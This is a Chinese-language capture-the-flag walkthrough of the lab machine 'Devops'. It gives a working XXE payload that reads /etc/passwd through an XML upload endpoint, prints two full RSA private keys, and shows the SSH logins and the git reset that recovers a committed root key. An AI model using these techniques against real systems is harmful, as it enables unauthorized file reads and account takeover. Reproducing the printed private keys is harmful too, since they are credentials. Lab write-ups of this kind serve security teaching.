---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Devops"
linktitle: "Devops"
date: 2022-06-17T16:56:40+08:00
type: book
summary: ""
test: 
---

# Devops

nmap

```bash
nmap -r -p- -vv -sV 10.10.10.91
```

![](image/image_D0A3SXFGxc.png)

5000端口

![](image/image_KGThTpwmek.png)

扫描web目录

![](image/image_-UT2qbjMnb.png)

发现上传xml功能

![](image/image_94QIpNn7cD.png)

上传发现直接解析了xml，并返回路径

```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
<Author>max</Author>
<Subject>test</Subject>
<Content>hello</Content>
</data>
```

![](image/image_xALVzT1qAH.png)

尝试利用`xxe`读取任意文件

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

    <!ENTITY  xxe SYSTEM "file:///etc/passwd" >

]>

<data>

<Author>&xxe;</Author>

<Subject>test</Subject>

<Content>hello</Content>

</data>
```

读到` /home` 目录下存在`osboxes、git、roosa、blogfeed` 用户，git和roosa有、`/bin/bash`权限

![](image/image_LGqV3GjtsP.png)

结合22端口，可以通过读取用户ssh证书实现免密登录

/home/roosa/.ssh/id\_rsa

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

登录roosa

```bash
mv id_rsa roosa_id_rsa

chmod 600 roosa_id_rsa

ssh -i roosa_id_rsa roosa@10.10.10.91

```

![](image/image_Lp9bz3pRim.png)

提权

查看` /home/roosa/.bash_history`

这里截取了关键的历史命令记录

```bash
mkdir resources
cd resources
mkdir integration
mkdir integration/auth_credentials.key
nano integration/auth_credentials.key/
ls -altr
chmod go-rwx authcredentials.key 
ls -atlr
cd ..
ls -altr
chmod -R o-rwx .
ls -altr
ls resources/
ls resources/integration/
ls -altr resources/
ls -altr resources/integration/
rm -Rf resources/integration/auth_credentials.key
mv resources/authcredentials.key resources/integration/ 
git add resources/integration/authcredentials.key #添加了一个ssh密钥
git commit -m 'add key for feed integration from tnerprise backend' #部署到仓库
ls -altr resources/integration/
git push #推送
ssh-keygen #重新生成一个ssh密钥
ös -altr
ls .altr
ls -altr
cat kak  
cp kak resources/integration/authcredentials.key  #覆盖之前的密钥
git add resources/integration/authcredentials.key #重新添加ssh密钥
git commit -m 'reverted accidental commit with proper key' #部署到仓库
git push #推送
ls -altr
rm kak #删除密钥
rm kak.pub 
git log
ls -altr


```

从备注的说法是push了一个错误的key，然后重新提交了。

猜测开发者刚开始push的key可能是高权限(root)的key

通过git回退到之前的版本，就能获取到root的登录密钥

查看git 提交日志

```bash
cd work/blogfeed

git log


```

![](image/image_6qA2yd8s9o.png)

回退到第一次添加key的版本

```bash
roosa@gitter:~/work/blogfeed$ git reset --hard d387abf63e05c9628a59195cec9311751bdb283f
HEAD is now at d387abf add key for feed integration from tnerprise backend

roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
```

authcredentials.key （root）

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----

```

登录root

```bash
chmod 600 resources/integration/authcredentials.key

ssh -i resources/integration/authcredentials.key root@127.0.0.1

```

![](image/image_QnNX9oUx2P.png)
